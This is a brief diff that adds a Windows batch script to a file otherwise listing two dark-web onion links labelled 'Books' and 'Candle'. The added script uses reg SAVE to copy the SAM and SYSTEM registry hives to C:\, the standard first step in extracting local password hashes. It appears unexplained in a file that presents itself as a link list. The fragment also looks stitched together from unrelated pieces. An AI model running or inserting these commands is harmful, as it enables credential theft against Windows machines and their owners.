@@ -1,3 +1,10 @@
+
+@echo off
+reg SAVE HKLM\SAM C:\SAM
+reg SAVE HKLM\SYSTEM C:\SYSTEM
+Exit
+
+
 Books : http://ytxmrc3pcbv5464e.onion.ws/files/
 
 Candle :http://gjobqjj7wyczbqie.onion/ 
